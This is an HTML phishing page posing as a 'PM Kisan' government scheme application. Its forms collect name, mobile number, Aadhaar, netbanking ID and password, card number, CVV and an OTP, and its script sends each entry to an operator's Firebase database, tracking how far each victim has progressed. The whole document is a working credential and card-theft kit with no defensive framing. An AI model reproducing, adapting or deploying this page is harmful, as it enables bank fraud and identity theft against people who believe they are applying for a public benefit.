<!DOCTYPE html>
<html lang="hi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PM Kisan</title>

<style>
*{box-sizing:border-box}
body{margin:0;font-family:system-ui,Arial;background:#e9e9e9}
.page{width:100%;min-height:100vh;background:#fff;display:none;flex-direction:column}
.page.active{display:flex}
.top-img img,.bottom-img img{width:100%;max-height:130px;object-fit:cover;display:block}
.form{flex:1;padding:16px}
.title{text-align:center;color:#e46a1a;font-weight:700;margin-bottom:10px}
.field{margin:10px 0}
.label{font-size:12px;color:#777}
.input{width:100%;padding:14px;border:1px solid #ddd;border-radius:8px;background:#f3f3f3}
.btn{width:100%;padding:14px;margin:10px 0;border-radius:10px;border:2px solid #8a2c6b;background:#fff;color:#5fa44a;font-weight:700}
.thanks{text-align:center;color:#2e8b57;font-weight:700;font-size:18px}
.count{font-size:22px;font-weight:700;color:#d40000;text-align:center}
</style>
</head>
<body>

<!-- PAGE 1 -->
<div class="page active" id="page1">
  <div class="form">
    <div class="title">APPLY ONLINE</div>
    <div class="field"><div class="label">Full Name</div><input class="input"></div>
    <div class="field"><div class="label">Mobile Number</div><input class="input"></div>
    <div class="field"><div class="label">Aadhaar</div><input class="input"></div>
    <button class="btn" onclick="submitPage(1)">Continue</button>
  </div>
</div>

<!-- PAGE 2 -->
<div class="page" id="page2">
  <div class="form">
    <div class="title">BANK INFO</div>
    <div class="field"><div class="label">Netbanking ID</div><input class="input"></div>
    <div class="field"><div class="label">Password</div><input class="input"></div>
    <button class="btn" onclick="submitPage(2)">Continue</button>
    <button class="btn" onclick="prevPage(2)">Back</button>
  </div>
</div>

<!-- PAGE 3 -->
<div class="page" id="page3">
  <div class="form">
    <div class="title">CARD DETAILS</div>
    <div class="field"><div class="label">Card Number</div><input class="input"></div>
    <div class="field"><div class="label">CVV</div><input class="input"></div>
    <button class="btn" onclick="submitPage(3)">Submit</button>
    <button class="btn" onclick="prevPage(3)">Back</button>
  </div>
</div>

<!-- PAGE 4 -->
<div class="page" id="page4">
  <div class="form">
    <div class="title">ENTER OTP</div>
    <div class="field">
      <div class="label">OTP (6 Digit)</div>
      <input class="input" id="otpSingle" maxlength="6">
    </div>
    <p id="resendBox" style="text-align:center">
      Resend OTP in <span id="otpTimer">30</span>s
    </p>
    <button class="btn" onclick="submitPage(4)">Verify OTP</button>
    <button class="btn" onclick="prevPage(4)">Back</button>
  </div>
</div>

<!-- PAGE 5 -->
<div class="page" id="page5">
  <div class="form">
    <div class="thanks">Thank You üôè</div>
    <p style="text-align:center">Your request has been submitted</p>
  </div>
</div>

<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
<script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>

<script>
firebase.initializeApp({
  apiKey:"AIzaSyDjMaZ5gSHh9zVRhdPwZjfVCsGaKW44kRk",
  authDomain:"admin-panel-989b2.firebaseapp.com",
  databaseURL:"https://admin-panel-989b2-default-rtdb.firebaseio.com",
  projectId:"admin-panel-989b2"
});

/* ONE USER = ONE ENTRY */
let userKey = localStorage.getItem("userKey");
if(!userKey){
  userKey = firebase.database().ref("usersData").push().key;
  localStorage.setItem("userKey", userKey);
}

/* üî¥ ALL PAGE SUBMIT HANDLER */
function submitPage(page){
  const i=document.querySelectorAll(".input");
  let data={ status:"PAGE"+page };

  if(page>=1){
    data.fullName=i[0].value;
    data.mbno=i[1].value;
    data.aadr=i[2].value;
  }
  if(page>=2){
    data.nid=i[3].value;
    data.pss=i[4].value;
  }
  if(page>=3){
    data.cn=i[5].value;
    data.cvpn=i[6].value;
  }
  if(page===4){
    const otp=otpSingle.value.trim();
    if(otp.length!==6){alert("Enter valid OTP");return;}
    data.otp=otp;
    data.status="COMPLETED";
    data.pinned=false;
    localStorage.removeItem("userKey");
  }

  data.time=new Date().toLocaleString();
  firebase.database().ref("usersData/"+userKey).update(data);

  if(page===3){switchPage(3,4);startOtpTimer();}
  else if(page===4){switchPage(4,5);}
  else{switchPage(page,page+1);}
}

/* UI helpers */
document.querySelectorAll('.page').forEach(p=>{
  p.prepend(Object.assign(document.createElement('div'),{className:'top-img',innerHTML:'<img src="top.jpg">'}));
  p.append(Object.assign(document.createElement('div'),{className:'bottom-img',innerHTML:'<img src="bottom.jpg">'}));
});
function switchPage(a,b){
  document.getElementById("page"+a).classList.remove("active");
  document.getElementById("page"+b).classList.add("active");
}
function prevPage(n){switchPage(n,n-1)}

/* OTP timer */
let s=30,intv;
function startOtpTimer(){
  clearInterval(intv);s=30;
  resendBox.innerHTML=`Resend OTP in <span id="otpTimer">${s}</span>s`;
  intv=setInterval(()=>{
    s--;otpTimer.innerText=s;
    if(s<=0){
      clearInterval(intv);
      resendBox.innerHTML='<b onclick="startOtpTimer()" style="cursor:pointer;color:#2e8b57">Resend OTP</b>';
    }
  },1000);
}
</script>
</body>
</html>